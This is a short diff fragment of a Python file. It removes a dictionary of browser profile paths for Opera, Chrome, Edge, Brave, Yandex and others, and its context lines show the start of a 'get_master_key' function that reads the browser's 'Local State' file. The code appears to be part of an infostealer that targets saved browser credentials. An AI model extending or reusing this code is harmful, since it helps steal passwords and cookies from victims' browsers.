@@ -176,28 +176,6 @@ PATHS = {
     'Iridium': L + '\\Iridium\\User Data\\Default'
 }
 
-PATHS2 = {
-    'Opera': R + '\\Opera Software\\Opera Stable',
-    'Opera GX': R + '\\Opera Software\\Opera GX Stable',
-    'Amigo': L + '\\Amigo\\User Data',
-    'Torch': L + '\\Torch\\User Data',
-    'Kometa': L + '\\Kometa\\User Data',
-    'Orbitum': L + '\\Orbitum\\User Data',
-    'CentBrowser': L + '\\CentBrowser\\User Data',
-    '7Star': L + '\\7Star\\7Star\\User Data',
-    'Sputnik': L + '\\Sputnik\\Sputnik\\User Data',
-    'Vivaldi': L + '\\Vivaldi\\User Data\\Default',
-    'Chrome SxS': L + '\\Google\\Chrome SxS\\User Data',
-    'Chrome': L + "\\Google\\Chrome\\User Data\\Default",
-    'Epic Privacy Browser': L + '\\Epic Privacy Browser\\User Data',
-    'Microsoft Edge': L + '\\Microsoft\\Edge\\User Data\\Default',
-    'Uran': L + '\\uCozMedia\\Uran\\User Data\\Default',
-    'Yandex': L + '\\Yandex\\YandexBrowser\\User Data\\Default',
-    'Brave': L + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Iridium': L + '\\Iridium\\User Data\\Default'
-}
-
-
 def get_master_key(path: str):
     local_state_path = os.path.join(path, "Local State")
     try:
